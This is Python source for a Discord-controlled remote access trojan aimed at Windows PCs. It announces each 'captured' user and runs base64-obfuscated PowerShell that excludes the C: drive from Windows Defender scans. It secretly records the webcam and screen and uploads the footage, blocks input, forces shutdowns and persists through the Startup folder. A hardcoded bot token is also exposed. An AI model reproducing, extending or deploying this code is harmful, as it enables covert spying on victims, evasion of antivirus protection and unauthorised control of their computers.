import discord
from discord.ext import commands
from discord.ext import tasks
import subprocess
import pyautogui
import asyncio
import os
from concurrent.futures import ThreadPoolExecutor
import time
import cv2
import zipfile
import numpy as np
import tkinter as tk
import ctypes
import sys
import shutil
import win32api
import win32con
import win32gui
import pygame
from pygame.locals import *
# Initialize bot with command prefix and intents
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Event: Bot is ready
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    # Get the PC user's name
    pc_username = os.getlogin()
    
    # Get the category by ID
    category_id = 1425289389084246067
    category = discord.utils.get(bot.get_all_channels(), id=category_id)
    
    if not category:
        print(f'Error: Could not find category with ID {category_id}')
        return
    
    # Search for a text channel with the PC user's name in the category
    channel = discord.utils.get(category.text_channels, name=pc_username.lower())
    
    if channel:
        # Channel exists, send welcome back message
        await channel.send(f'PC turned on, user {pc_username} back online!')
    else:
        # Create a new channel with the PC user's name
        channel = await category.create_text_channel(pc_username)
        await channel.send(f'New user captured: {pc_username}!')

# Command: Hello
@bot.command()
async def hello(ctx):
    await ctx.send(f'Hello, {ctx.author.mention}!')

# Command: Info
@bot.command()
async def info(ctx):
    await ctx.send('I am a simple Discord bot created with discord.py!')

@bot.command()
async def exc_1(ctx):
    await ctx.send("3xc1usion has ben sent to the reg") 
    subprocess.run("powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==")

@bot.command()
async def exc_rem2(ctx):
    await ctx.send("3xc1usion has been removed from the reg")
    subprocess.run("powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAALQBOAGEAbQBlACAAIgBDADoAXAAiAA0ACgA=")

@bot.command()
async def rest_lap(ctx, seconds, message):
    await ctx.send(f"System will poweroff in {seconds}.")
    subprocess.run(f'shutdown /s /t {seconds} /c "{message}"', shell=True)

@bot.command()
async def eyes_0(ctx, seconds: int):
    await ctx.send(f"Starting screenshot capture for {seconds} seconds...")
    for i in range(seconds):
        filename = f"screenshot_{i}.png"
        # Take screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        # Send file to channel
        with open(filename, "rb") as f:
            picture = discord.File(f)
            await ctx.send(file=picture)
        # Delete file
        os.remove(filename)
        # Wait 1 second before next screenshot
        await asyncio.sleep(1)
    await ctx.send("Done capturing and sending screenshots.")


def flash_screen(duration):
    """
    Flashes the screen between black and normal (underlying desktop/game) for `duration` seconds.
    Uses a Pygame overlay to work over fullscreen applications like games.
    """
    try:
        pygame.init()
        info = pygame.display.Info()
        screen = pygame.display.set_mode((info.current_w, info.current_h), pygame.NOFRAME | pygame.SRCALPHA)
        hwnd = pygame.display.get_wm_info()['window']

        # Set window to layered, transparent (click-through), and always on top
        win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, 
                               win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | 
                               win32con.WS_EX_LAYERED | win32con.WS_EX_TRANSPARENT | win32con.WS_EX_TOPMOST)
        win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_ALPHA)
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, 
                              win32con.SWP_NOMOVE | win32con.SWP_NOSIZE | win32con.SWP_SHOWWINDOW | win32con.SWP_NOACTIVATE)

        start_time = time.time()
        is_black = False
        while time.time() - start_time < duration:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    break

            # Toggle between black and normal (transparent)
            if is_black:
                screen.fill((0, 0, 0, 255))  # Black, fully opaque
            else:
                screen.fill((0, 0, 0, 0))  # Transparent, shows underlying screen
                # Draw a subtle border to indicate normal screen
                pygame.draw.rect(screen, (255, 255, 255, 50), (0, 0, info.current_w, info.current_h), 5)

            is_black = not is_black
            pygame.display.flip()
            time.sleep(0.3)  # Faster toggle for clearer flashing effect

        pygame.quit()

    except Exception as e:
        pygame.quit()
        raise RuntimeError(f"Flash screen failed: {e}")

@bot.command()
async def flash(ctx, duration: int):
    """
    Flashes the screen between black and normal (underlying desktop/game) for `duration` seconds.
    Uses a Pygame overlay to work even in fullscreen games.
    """
    if duration <= 0 or duration > 60:  # Safety limit
        await ctx.send("❌ Duration must be between 1 and 60 seconds.")
        return
    await ctx.send(f"⚡ Flashing screen for {duration} seconds...")
    loop = asyncio.get_running_loop()
    try:
        await loop.run_in_executor(None, flash_screen, duration)
        await ctx.send("✅ Done flashing!")
    except Exception as e:
        await ctx.send(f"❌ Error during flashing: {e}")

# For draw_mouse using Pygame transparent overlay (works over fullscreen games)
def draw_mouse_func(duration=5):  # Renamed from draw_mounse to fix typo
    pygame.init()
    info = pygame.display.Info()
    screen = pygame.display.set_mode((info.current_w, info.current_h), NOFRAME | SRCALPHA)
    hwnd = pygame.display.get_wm_info()['window']

    # Set window to layered, transparent (click-through), and always on top
    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED | win32con.WS_EX_TRANSPARENT | win32con.WS_EX_TOPMOST)
    win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_ALPHA)  # Full opacity for drawings, but surface has alpha
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE | win32con.SWP_SHOWWINDOW | win32con.SWP_NOACTIVATE)

    clock = pygame.time.Clock()
    start_time = time.time()
    mouse_trail = []

    while time.time() - start_time < duration:
        for event in pygame.event.get():
            if event.type == QUIT:
                break

        screen.fill((0, 0, 0, 0))  # Transparent background

        # Get mouse position (system-wide)
        pos = win32api.GetCursorPos()

        mouse_trail.append(pos)
        if len(mouse_trail) > 10:  # Limit trail length for "following" effect
            mouse_trail.pop(0)

        for i, p in enumerate(mouse_trail):
            alpha = int(255 * (i + 1) / len(mouse_trail))  # Fade effect
            color = (255, 0, 0, alpha)
            pygame.draw.rect(screen, color, (p[0] - 10, p[1] - 10, 20, 20))

        pygame.display.flip()
        clock.tick(60)

    pygame.quit()

@bot.command()
async def draw_mouse(ctx, duration: int = 5):
    """
    Draws red squares following the mouse for `duration` seconds (default 5).
    Uses a transparent overlay that works over fullscreen games like Fortnite.
    """
    await ctx.send(f"🎨 Drawing red squares following the mouse for {duration}s...")
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, draw_mouse_func, duration)
    await ctx.send("✅ Done drawing!")

@bot.command()
async def no_move(ctx, duration: int):
    """
    Blocks keyboard and mouse input for `duration` seconds.
    WARNING: Use carefully, as it will make the computer unresponsive temporarily.
    This should work system-wide, including in games.
    """
    await ctx.send(f"⛔ Blocking input for {duration} seconds...")

    # Block input (system-wide Windows API)
    ctypes.windll.user32.BlockInput(True)
    try:
        await asyncio.sleep(duration)
    finally:
        # Always unblock
        ctypes.windll.user32.BlockInput(False)

    await ctx.send("✅ Input unblocked!")



@bot.command()
async def open_edge(ctx, url: str, tabs: int):
    """
    Opens Microsoft Edge with the specified URL in multiple tabs.
    Usage: !open_edge https://example.com 3
    """
    if not url.startswith("https://") and not url.startswith("http://"):
        await ctx.send("❌ Please provide a valid URL starting with https:// or http://")
        return

    await ctx.send(f"🌐 Opening {tabs} tab(s) of {url} in Edge...")

    # Default Edge path on Windows
    edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"

    for _ in range(tabs):
        subprocess.Popen([edge_path, "--new-tab", url])
        await asyncio.sleep(0.3)  # small delay to avoid overload

    await ctx.send(f"✅ Successfully opened {tabs} tab(s) of {url}.")


MAX_DISCORD_FILESIZE = 10 * 1024 * 1024  # 10mB default limit
VIDEO_EXT = ".mp4"
ZIP_EXT = ".zip"

async def send_video_file(ctx, video_filename):
    """
    Sends a video file to Discord, zipping if necessary, and cleans up files.
    Returns True if sent successfully, False otherwise.
    """
    try:
        # Check if video file exists
        if not os.path.exists(video_filename):
            await ctx.send("❌ Error: Video file was not created.")
            return False

        file_size = os.path.getsize(video_filename)
        zip_filename = video_filename.replace(VIDEO_EXT, ZIP_EXT)

        # If file exceeds Discord's limit, create a zip
        if file_size > MAX_DISCORD_FILESIZE:
            try:
                with zipfile.ZipFile(zip_filename, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
                    zipf.write(video_filename)
                
                # Check zip file size
                zip_size = os.path.getsize(zip_filename)
                if zip_size > MAX_DISCORD_FILESIZE:
                    await ctx.send(f"❌ Error: Zipped file ({zip_size / 1024 / 1024:.2f} MB) still exceeds Discord's 8MB limit.")
                    os.remove(video_filename)
                    if os.path.exists(zip_filename):
                        os.remove(zip_filename)
                    return False
                
                await ctx.send(f"⚠️ Video ({file_size / 1024 / 1024:.2f} MB) too large. Sending zipped version.")
                await ctx.send(file=discord.File(zip_filename))
                os.remove(video_filename)
                os.remove(zip_filename)
            except Exception as e:
                await ctx.send(f"❌ Error creating/sending zip file: {e}")
                os.remove(video_filename)
                if os.path.exists(zip_filename):
                    os.remove(zip_filename)
                return False
        else:
            await ctx.send(file=discord.File(video_filename))
            os.remove(video_filename)
        
        return True
    except Exception as e:
        await ctx.send(f"❌ Error sending file: {e}")
        if os.path.exists(video_filename):
            os.remove(video_filename)
        if os.path.exists(zip_filename):
            os.remove(zip_filename)
        return False

@bot.command()
async def csnap(ctx, seconds: int):
    """
    Records webcam video for the specified duration and sends it to Discord.
    """
    if seconds <= 0 or seconds > 300:
        await ctx.send("❌ Duration must be between 1 and 300 seconds.")
        return

    await ctx.send(f"🎥 Recording webcam for {seconds} seconds at 640x480 @ 30 FPS...")

    try:
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            await ctx.send("❌ Could not access the camera.")
            return

        # Set resolution and FPS
        width, height = 640, 480
        fps = 30.0
        camera.set(cv2.CAP_PROP_FRAME_WIDTH, width)
        camera.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
        camera.set(cv2.CAP_PROP_FPS, fps)

        # Initialize video writer
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_filename = "webcam_video.mp4"
        out = cv2.VideoWriter(video_filename, fourcc, fps, (width, height))

        start_time = time.time()
        while (time.time() - start_time) < seconds:
            ret, frame = camera.read()
            if not ret:
                await ctx.send("⚠️ Failed to capture frame.")
                break
            out.write(frame)

        # Release resources
        camera.release()
        out.release()
        cv2.destroyAllWindows()

        # Send the video file
        await send_video_file(ctx, video_filename)

    except Exception as e:
        await ctx.send(f"❌ Error during webcam recording: {e}")
        if 'camera' in locals():
            camera.release()
        if 'out' in locals():
            out.release()
        if os.path.exists(video_filename):
            os.remove(video_filename)

@bot.command()
async def recv(ctx, duration: int = 10):
    """
    Records the screen for the specified duration and sends it to Discord.
    """
    if duration <= 0 or duration > 300:
        await ctx.send("❌ Duration must be between 1 and 300 seconds.")
        return

    await ctx.send(f"🎥 Recording screen for {duration} seconds...")

    try:
        screen_width, screen_height = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_filename = "screen_record.mp4"
        out = cv2.VideoWriter(video_filename, fourcc, 20.0, (screen_width, screen_height))

        start_time = time.time()
        while (time.time() - start_time) < duration:
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()

        # Send the video file
        await send_video_file(ctx, video_filename)

    except Exception as e:
        await ctx.send(f"❌ Error during screen recording: {e}")
        if 'out' in locals():
            out.release()
        if os.path.exists(video_filename):
            os.remove(video_filename)

@bot.command()
async def recspli0(ctx, duration: int = 10):
    """
    Records both webcam and screen side-by-side for the specified duration and sends to Discord.
    """
    if duration <= 0 or duration > 300:
        await ctx.send("❌ Duration must be between 1 and 300 seconds.")
        return

    await ctx.send(f"📹 Recording webcam + screen for {duration} seconds...")

    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            await ctx.send("❌ Could not open webcam.")
            return

        screen_width, screen_height = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_filename = "split_record.mp4"
        out = cv2.VideoWriter(video_filename, fourcc, 20.0, (screen_width, screen_height))

        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame_cam = cam.read()
            if not ret:
                await ctx.send("⚠️ Failed to capture webcam frame.")
                break

            screenshot = pyautogui.screenshot()
            frame_screen = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)

            # Resize both to same height
            target_height = min(frame_cam.shape[0], frame_screen.shape[0])
            frame_cam = cv2.resize(frame_cam, (int(frame_cam.shape[1] * target_height / frame_cam.shape[0]), target_height))
            frame_screen = cv2.resize(frame_screen, (int(frame_screen.shape[1] * target_height / frame_screen.shape[0]), target_height))

            combined_frame = cv2.hconcat([frame_cam, frame_screen])
            combined_frame = cv2.resize(combined_frame, (screen_width, screen_height))
            out.write(combined_frame)

        cam.release()
        out.release()

        # Send the video file
        await send_video_file(ctx, video_filename)

    except Exception as e:
        await ctx.send(f"❌ Error during split recording: {e}")
        if 'cam' in locals():
            cam.release()
        if 'out' in locals():
            out.release()
        if os.path.exists(video_filename):
            os.remove(video_filename)

@bot.command()
async def clean_chat(ctx):
    """
    Deletes all messages in the current channel, including attachments and videos.
    """
    await ctx.send("🧹 Cleaning all messages in this channel...")

    def is_not_pinned(message):
        return not message.pinned

    deleted = True
    while deleted:
        # Bulk delete up to 100 messages at a time
        deleted = await ctx.channel.purge(limit=100, check=is_not_pinned)
    
    await ctx.send("✅ All messages deleted!", delete_after=5)

async def add_to_startup(file_path, file_name, startup_folder):
    """
    Helper function to copy a file to the startup folder and verify.
    Returns True if successful, False otherwise.
    """
    dest_path = os.path.join(startup_folder, file_name)
    try:
        if not os.path.exists(dest_path):
            shutil.copy2(file_path, dest_path)
        if os.path.exists(dest_path):
            return True
        return False
    except PermissionError:
        return False
    except Exception:
        return False

@tasks.loop(minutes=1.0)
async def check_startup():
    """
    Background task to check every minute if the file is in the startup folder.
    Re-adds it if missing.
    """
    try:
        file_path = os.path.abspath(sys.argv[0])
        file_name = os.path.basename(file_path)
        file_ext = os.path.splitext(file_name)[1].lower()
        
        if file_ext not in ('.py', '.exe'):
            return  # Silently skip invalid files
        
        # Define C:\BotStartup path
        c_drive_folder = r"C:\BotStartup"
        c_drive_path = os.path.join(c_drive_folder, file_name)
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Check if file exists in startup folder
        startup_path = os.path.join(startup_folder, file_name)
        if not os.path.exists(startup_path):
            # Ensure C:\BotStartup file exists
            if os.path.exists(c_drive_path):
                # Re-add to startup
                if await add_to_startup(c_drive_path, file_name, startup_folder):
                    print(f"Re-added '{file_name}' to startup folder.")
                else:
                    print(f"Failed to re-add '{file_name}' to startup folder.")
    except Exception as e:
        print(f"Error in check_startup task: {e}")

@bot.command()
async def startup(ctx):
    """
    Copies the current Python script or executable to C:\BotStartup and Windows startup.
    Runs the bot from C:\BotStartup and checks startup folder every minute.
    """
    try:
        # Get the path to the currently running Python file or executable
        file_path = os.path.abspath(sys.argv[0])
        file_name = os.path.basename(file_path)
        file_ext = os.path.splitext(file_name)[1].lower()

        # Validate that the file is a Python script or executable
        if file_ext not in ('.py', '.exe'):
            await ctx.send("❌ Error: Only Python scripts (.py) or executables (.exe) can be added to startup.")
            return

        # Define C:\BotStartup folder
        c_drive_folder = r"C:\BotStartup"
        c_drive_path = os.path.join(c_drive_folder, file_name)

        # Create C:\BotStartup if it doesn't exist
        try:
            os.makedirs(c_drive_folder, exist_ok=True)
        except PermissionError:
            await ctx.send("❌ Error: Permission denied creating C:\BotStartup. Run as administrator.")
            return
        except Exception as e:
            await ctx.send(f"❌ Error creating C:\BotStartup: {e}")
            return

        # Copy to C:\BotStartup
        try:
            shutil.copy2(file_path, c_drive_path)
        except PermissionError:
            await ctx.send("❌ Error: Permission denied copying to C:\BotStartup. Run as administrator.")
            return
        except Exception as e:
            await ctx.send(f"❌ Error copying to C:\BotStartup: {e}")
            return

        # Verify copy to C:\BotStartup
        if not os.path.exists(c_drive_path):
            await ctx.send("❌ Error: Failed to verify file in C:\BotStartup.")
            return

        # Copy to startup folder
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        if not os.path.exists(startup_folder):
            await ctx.send("❌ Error: Startup folder not found. Ensure you're running on Windows.")
            return

        startup_path = os.path.join(startup_folder, file_name)
        try:
            if not os.path.exists(startup_path):
                shutil.copy2(c_drive_path, startup_path)
        except PermissionError:
            await ctx.send("❌ Error: Permission denied copying to startup folder. Run as administrator.")
            return
        except Exception as e:
            await ctx.send(f"❌ Error copying to startup folder: {e}")
            return

        # Verify copy to startup folder
        if not os.path.exists(startup_path):
            await ctx.send("❌ Error: Failed to verify file in startup folder.")
            return

        # Start the background task to check startup folder (if not already running)
        if not check_startup.is_running():
            check_startup.start()

        await ctx.send(f"✅ Success! '{file_name}' copied to C:\BotStartup and added to Windows startup. "
                       f"Will run from C:\BotStartup and be checked every minute.")

    except Exception as e:
        await ctx.send(f"❌ An unexpected error occurred: {e}")
    
@bot.command()
async def tutorial(ctx):
    """
    Displays a formatted guide of all available bot commands with descriptions and examples.
    """

    tutorial_message = """
# 📖 Bot Command Tutorial
Welcome! Use the `!` prefix for all commands. Some commands may require extra permissions.

## General Commands
- **!hello**  
  Greets you with a personalized message.  

- **!info**  
  Displays information about the bot.  

## System Commands
- **!exc_1**  
  Example exclusion command.  

- **!exc_rem2**  
  Example remove exclusion command.  

- **!startup**  
  Example startup command.  

- **!rest_lap <seconds> <message>**  
  Example restart command.  

## Screen & Input Commands
- **!eyes_0 <seconds>**  
  Example screenshot command.  

- **!draw_mouse <duration>**  
  Example mouse drawing.  

- **!no_move <duration>**  
  Example input blocking.  

- **!flash <duration>**  
  Example flashing effect.  

## Browser Commands
- **!open_edge <url> <tabs>**  
  Example browser opener.  

## Recording Commands
- **!csnap <seconds>**  
  Example webcam recording.  

- **!recv <seconds>**  
  Example screen recording.  

- **!recspli0 <seconds>**  
  Example combined recording.  

## Channel Commands
- **!clean_chat**  
  Example chat cleanup.  

---
**Notes**:
- Keep durations short to avoid large files.
- Some commands need admin rights.
"""

    # Split into chunks under Discord's 2000-char limit
    parts = [tutorial_message[i:i+1990] for i in range(0, len(tutorial_message), 1990)]
    for part in parts:
        await ctx.send(part)

# Run the bot
bot.run('MTQwODg4MDEzNzAwMDQ1NjIyMg.GEHo87.7PyPOirLxwY_H64DqzV8U4_uCPQCbrMWxByhG8')